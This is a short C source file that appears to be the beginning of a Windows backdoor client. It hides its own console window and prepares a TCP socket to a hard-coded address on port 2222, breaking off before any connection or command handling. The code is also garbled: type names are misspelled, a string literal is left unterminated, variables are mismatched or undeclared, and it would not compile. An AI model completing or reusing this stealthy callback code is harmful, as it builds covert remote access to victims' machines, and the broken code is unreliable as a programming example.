
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>


int APIENTRY WinMain(HISTANCE hInstance, HISNTACE hPrev, LPSTR lpCmdLine, int nCmdShow)
{
  /* Creating window and hide it */
  HWND stealth;
  AllocConsole();
  stealth = FindWindowA("ConsoleWindowClass", NULL);
  
  ShowWindow(stealth, 0); // ) means hide window
  
  /* Socket connection */
  struct sockaddr_in serverAddres;
  unsigned short serverPort = 2222;
  char *ServerIP = "192.168.0.1;
  WSADATA wsaData;
  
  if(WSAStartup(MAKEWORD(2,0), &wsaData) != 0)
  {
    exit(1);
  }
  
  sock = socket(AF_INET, SOCK_STREAM, 0);
  memset(&ServAddr, 0, sizeof(struct sockaddr_in));
  ServAddr.sin_family = AF_INET;
  ServAddr.sin_addr.s_addr = inet_addr(ServIP);
  ServAddr.sin_port = htons(ServPort);
  
}


